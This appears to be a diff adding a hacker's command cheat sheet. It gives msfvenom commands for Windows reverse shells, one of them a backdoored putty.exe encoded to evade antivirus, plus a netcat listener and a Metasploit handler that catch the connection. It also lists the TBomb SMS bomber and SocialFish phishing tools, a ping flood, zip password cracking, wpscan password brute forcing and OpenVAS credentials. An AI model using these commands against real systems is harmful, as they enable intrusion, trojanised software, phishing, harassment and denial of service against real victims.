@@ -1,0 +1,53 @@
+#john the ripper
+zip -re output_file.zip file1 folder1
+zip2john file.zip>hashes
+john hashes
+
+#msfvenom
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.80.135 lport=555 -f exe > shell.exe
+#listen to port
+nc –lvp 443
+
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.0.103 lport=443 -f aspx > shell.aspx
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=443 -f exe -a x86 -o puttyO.exe --platform windows -x putty.exe -e x86/shikata_ga_nai -i 20
+
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.103
+set LPORT 443
+exploit
+
+
+
+git clone https://github.com/sherlock-project/sherlock.git
+python3 -m pip install -r requirements.txt
+
+
+
+
+git clone https://github.com/TheSpeedX/TBomb.git
+
+
+git clone https://github.com/UndeadSec/SocialFish.git
+cd SocialFish
+python3 -m pip install -r requirements.txt
+python3 SocialFish.py youruser yourpassword
+
+#ping flood
+sudo ping -f -s 56500 IP
+
+
+#openvas
+sudo apt install openvas
+sudo gvm-setup
+sudo gvm-start
+https://localhost:9392
+username: admin password:1bbb8a14-7c01-477a-b0f5-dca9dfe8e8bb
+8946f79b-0cab-42a4-a2fe-2e314cec7db2
+
+#wpscan
+wpscan --url yourwebsite.com -e u
+wpscan --url yourwebsite.com -passwords file/path/passwords.txt
